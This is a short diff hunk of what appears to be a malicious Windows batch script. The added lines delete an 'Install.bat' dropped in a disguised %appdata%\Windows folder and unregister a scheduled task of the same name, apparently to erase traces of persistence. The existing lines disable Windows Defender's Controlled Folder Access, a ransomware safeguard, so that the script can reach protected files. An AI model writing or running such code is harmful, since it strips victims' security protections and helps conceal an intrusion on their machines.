@@ -1,3 +1,6 @@
+del /f "%appdata%\Windows\Install.bat"
+rd %appdata%\Windows
+powershell -Command "Unregister-ScheduledTask -TaskName 'Install.bat' -Confirm:$false"
 color ef
 ::disables ControlledFolderAccess to access files and folders
 powershell -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
